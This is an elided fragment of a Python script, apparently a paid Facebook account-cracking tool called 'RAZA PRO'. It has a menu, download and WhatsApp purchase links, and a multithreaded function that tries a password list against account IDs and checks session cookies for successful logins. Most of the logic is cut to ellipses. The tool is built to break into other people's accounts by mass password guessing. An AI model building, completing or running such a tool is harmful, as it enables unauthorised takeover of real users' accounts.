        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                print(' Put file example:  /sdcard/AYAAN.txt  etc..')
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/RAZA_VPN1.0.apk/file');menu()

                        elif xd in ['8','08']:

                                os.system('xdg-open https://www.facebook.com/groups/734661014839354/permalink/735085361463586/');menu()

                        elif xd in ['0','00']:

                                exit(' Thanks for use Ali Raza XD')
                        ...
                        url_wa = "https://api.whatsapp.com/send?phone=+923059210924&text="

                        name = input(" Enter your Name : ")

                        linex()

                        tks = ("Hi sarkar Sir, I Need To Buy Your Paid RAZA PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)

                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)

                        print(' Run :  python RAZA.py')
...
def pak():
                ...
                with tred(max_workers=30) as RAZA:     
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [RAZA-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        RAZA=session.cookies.get_dict().keys()
...
git@github.com:MahummadAyaanTricks404/RAZA-PRO.git
